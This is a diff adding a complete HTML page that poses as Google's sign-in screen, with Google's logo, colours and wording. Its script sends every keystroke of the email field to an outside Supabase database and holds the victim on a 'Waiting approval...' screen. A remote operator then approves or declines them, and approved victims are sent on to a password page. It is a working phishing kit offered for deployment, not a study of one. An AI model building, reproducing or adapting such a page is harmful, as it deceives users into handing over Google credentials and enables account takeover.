@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/@supabase/supabase-js"></script>
+    <style>
+    :root {
+      font-size: 100%; /* base = 16px, respects device & user settings */
+    }
+
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #f0f4f9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+
+    /* ===== Preloader ===== */
+    .preloader {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      animation: fadeOut 0.5s ease forwards;
+      animation-delay: 3s;
+    }
+
+    .google-text {
+      font-size: clamp(2rem, 6vw, 3.75rem); /* scales with screen + zoom */
+      font-weight: bold;
+      display: flex;
+      gap: 0.25rem;
+    }
+    .google-text span {
+      opacity: 0;
+      transform: rotateY(90deg);
+      display: inline-block;
+      animation: revealLetter 0.6s ease forwards;
+    }
+    .google-text span:nth-child(1) { color: #4285F4; animation-delay: 0s; }
+    .google-text span:nth-child(2) { color: #EA4335; animation-delay: 0.3s; }
+    .google-text span:nth-child(3) { color: #FBBC05; animation-delay: 0.6s; }
+    .google-text span:nth-child(4) { color: #4285F4; animation-delay: 0.9s; }
+    .google-text span:nth-child(5) { color: #34A853; animation-delay: 1.2s; }
+    .google-text span:nth-child(6) { color: #EA4335; animation-delay: 1.5s; }
+
+    @keyframes revealLetter {
+      0%   { opacity: 0; transform: rotateY(90deg); }
+      50%  { opacity: 1; transform: rotateY(-10deg); }
+      100% { opacity: 1; transform: rotateY(0deg); }
+    }
+    @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
+
+    /* ===== Card ===== */
+    .card {
+      background: #fff;
+      border-radius: 0.75rem;
+      box-shadow: 0 0.25rem 1.25rem rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: column;
+      padding: 2rem 1.5rem;
+      width: 100%;
+      max-width: 25rem;
+      margin: auto;
+      opacity: 0;
+      transform: translateY(2.5rem);
+      animation: fadeSlideIn 2s ease forwards;
+      animation-delay: 3.2s;
+    }
+
+    @keyframes fadeSlideIn {
+      0% { opacity: 0; transform: translateY(2.5rem); }
+      50% { opacity: 0.6; transform: translateY(0.625rem); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+
+    .loader-bar { position:absolute; top:0; left:0; height:3px; width:100%; background:transparent; overflow:hidden; display:none; z-index:5; }
+    .loader-bar.active{ display:block; }
+    .loader-bar::before{ content:""; position:absolute; left:-40%; top:0; width:40%; height:100%; background:#1a73e8; animation: loading 1s infinite; }
+    @keyframes loading { 0%{left:-40%}50%{left:60%}100%{left:100%} }
+
+    .overlay { position:absolute; inset:0; backdrop-filter: blur(4px); background: rgba(255,255,255,0.65); display:none; z-index:4; }
+    .overlay.active { display:block; }
+
+    .google-logo { width: 4.5rem; margin-bottom: 1.25rem; }
+
+    h1 {
+      font-size: clamp(1.375rem, 2vw, 2rem);
+      font-weight: 400;
+      margin: 0 0 1rem;
+      color: #202124;
+    }
+    .desc {
+      font-size: clamp(0.875rem, 1.5vw, 1rem);
+      color: #5f6368;
+      line-height: 1.6;
+      margin-bottom: 1.5rem;
+    }
+
+    .input-box { margin-bottom: 0.625rem; }
+    .input-box input {
+      width: 100%;
+      padding: 0.875rem;
+      border: 1px solid #dadce0;
+      border-radius: 0.25rem;
+      font-size: 1rem;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+    .input-box input:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0.0625rem 0.1875rem rgba(0,0,0,0.1);
+    }
+
+    .error-message {
+      font-size: 0.8125rem;
+      color: #d93025;
+      margin: 0.25rem 0 0.875rem;
+      display: none;
+    }
+
+    .forgot {
+      font-size: 0.875rem;
+      color: #1a73e8;
+      text-decoration: none;
+      display: inline-block;
+      margin-bottom: 1.75rem;
+    }
+    .forgot:hover { text-decoration: underline; }
+
+    .note {
+      font-size: 0.8125rem;
+      color: #5f6368;
+      margin-bottom: 2rem;
+      display: none;
+    }
+    .note a { color: #1a73e8; text-decoration: none; }
+    .note a:hover { text-decoration: underline; }
+
+    .right { display: flex; flex-direction: column; flex: 1; }
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: auto;
+    }
+
+    .disabled-link {
+      font-size: 0.875rem;
+      color: #a1a1a1;
+      text-decoration: none;
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+
+    .next-btn {
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      padding: 0.625rem 1.75rem;
+      font-size: 0.875rem;
+      font-weight: 500;
+      border-radius: 1.5rem;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+    .next-btn:hover { background: #1765cc; }
+
+    /* ===== Mobile Mode ===== */
+    @media (max-width: 600px) {
+      .card {
+        height: 90vh;
+        max-width: 95%;
+      }
+    }
+
+    /* ===== Tablet Mode ===== */
+    @media (min-width: 601px) and (max-width: 991px) {
+      .card {
+        max-width: 37.5rem;
+        padding: 2.5rem 2rem;
+        min-height: 35rem;
+      }
+      h1 { font-size: 1.75rem; }
+      .desc { font-size: 1rem; }
+    }
+
+    /* ===== Desktop Mode ===== */
+    @media (min-width: 992px) {
+      .card {
+        flex-direction: row;
+        align-items: center;
+        justify-content: space-between;
+        max-width: 56.25rem;
+        padding: 3.75rem;
+        gap: 3.75rem;
+        height: auto;
+      }
+      .left, .right {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+      }
+      .left { padding-right: 2rem; }
+      h1 { font-size: 2rem; }
+      .note { display: block; }
+    }
+
+    /* ===== Reduced Motion Support ===== */
+    @media (prefers-reduced-motion: reduce) {
+      * {
+        animation: none !important;
+        transition: none !important;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Preloader -->
+  <div class="preloader" id="preloader">
+    <div class="google-text">
+      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+  </div>
+
+  <!-- Sign In Card -->
+  <div class="card" id="card">
+    <div class="loader-bar" id="loader"></div>
+    <div class="overlay" id="overlay"></div>
+
+    <div class="left">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
+      <h1>Sign in</h1>
+      <p class="desc">Use your Google Account to continue. This account will be available to other Google apps.</p>
+    </div>
+
+    <div class="right">
+      <div class="input-box">
+        <input type="text" id="email" placeholder="Email" aria-label="Email address">
+        <p class="error-message" id="error-message">Invalid email. Please enter a valid username or Gmail address.</p>
+      </div>
+      <a href="#" class="forgot">Forgot email?</a>
+      <p class="note">
+        Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a>
+      </p>
+      <div class="actions">
+        <a class="disabled-link">Create account</a>
+        <button class="next-btn" id="nextBtn">Next</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+  const SUPABASE_URL = "https://bipnmthaonkbffothwkj.supabase.co";
+  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJpcG5tdGhhb25rYmZmb3Rod2tqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk3OTc0NDUsImV4cCI6MjA3NTM3MzQ0NX0.9mNaxvZolgyyvyZP7n2x_nUwL8h1EHknpjR4_aMlPyc";
+  const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+  const emailInput = document.getElementById("email");
+  const errorMessage = document.getElementById("error-message");
+  const nextBtn = document.getElementById("nextBtn");
+  const loader = document.getElementById("loader");
+  const overlay = document.getElementById("overlay");
+  const preloader = document.getElementById("preloader");
+
+  let deviceId = localStorage.getItem("device_id");
+  if (!deviceId) {
+    deviceId = "dev-" + Math.random().toString(36).substring(2) + Date.now();
+    localStorage.setItem("device_id", deviceId);
+  }
+
+  function isValidEmailLike(val) {
+    const usernameRegex = /^[a-zA-Z0-9.]+$/;
+    const gmailRegex = /^[a-zA-Z0-9.]+@gmail\.com$/;
+    return usernameRegex.test(val) || gmailRegex.test(val);
+  }
+
+  async function ensureSession() {
+    const { data } = await client.from("logins").select("*").eq("device_id", deviceId).maybeSingle();
+    if (!data) {
+      // Create new record as "onpage"
+      await client.from("logins").insert({
+        device_id: deviceId,
+        page_name: "login",
+        is_active: true,
+        login_status: "onpage"
+      });
+    } else {
+      // Update existing to mark as active and onpage
+      await client.from("logins").update({
+        page_name: "login",
+        is_active: true,
+        login_status: "onpage"
+      }).eq("device_id", deviceId);
+    }
+  }
+
+  async function updateField(field, value) {
+    await client.from("logins").update({ [field]: value }).eq("device_id", deviceId);
+  }
+
+  function showLoadingUI() {
+    loader.classList.add("active");
+    overlay.classList.add("active");
+    nextBtn.disabled = true;
+    nextBtn.textContent = "Waiting approval...";
+  }
+
+  function hideLoadingUI() {
+    loader.classList.remove("active");
+    overlay.classList.remove("active");
+    nextBtn.disabled = false;
+    nextBtn.textContent = "Next";
+  }
+
+  emailInput.addEventListener("input", (e) => updateField("username", e.target.value.trim()));
+
+  nextBtn.addEventListener("click", async (e) => {
+    e.preventDefault();
+    const val = emailInput.value.trim();
+    if (!isValidEmailLike(val)) {
+      errorMessage.style.display = "block";
+      errorMessage.textContent = "Please enter a valid username or Gmail address.";
+      return;
+    }
+
+    errorMessage.style.display = "none";
+    showLoadingUI();
+
+    await updateField("username", val);
+    // 🔹 Change status to pending when Next is clicked
+    await client.from("logins").update({ login_status: "pending" }).eq("device_id", deviceId);
+  });
+
+  async function checkStatusManually() {
+    const { data } = await client
+      .from("logins")
+      .select("login_status")
+      .eq("device_id", deviceId)
+      .maybeSingle();
+    if (!data) return;
+    handleStatus(data.login_status);
+  }
+
+  function handleStatus(status) {
+    if (!status) return;
+    if (status === "approved") {
+      window.location.href = "passpage.html"; // redirect to next step
+    } else if (status === "declined") {
+      hideLoadingUI();
+      errorMessage.style.display = "block";
+      errorMessage.textContent = "Invalid email. Viewer declined access.";
+    }
+  }
+
+  window.addEventListener("load", async () => {
+    await ensureSession();
+    setTimeout(() => preloader.remove(), 1000);
+
+    // 🔹 Subscribe to realtime updates
+    const channel = client
+      .channel("realtime:logins")
+      .on(
+        "postgres_changes",
+        { event: "UPDATE", schema: "public", table: "logins", filter: `device_id=eq.${deviceId}` },
+        (payload) => handleStatus(payload.new.login_status)
+      )
+      .subscribe((status) => {
+        if (status === "SUBSCRIBED") console.log("✅ Realtime connected");
+        else console.log("⚠️ Realtime status:", status);
+      });
+
+    // 🔹 Fallback polling
+    setInterval(checkStatusManually, 1000);
+  });
+
+  window.addEventListener("beforeunload", () => {
+    client.from("logins").update({ is_active: false }).eq("device_id", deviceId);
+  });
+</script>
+</body>
+</html>
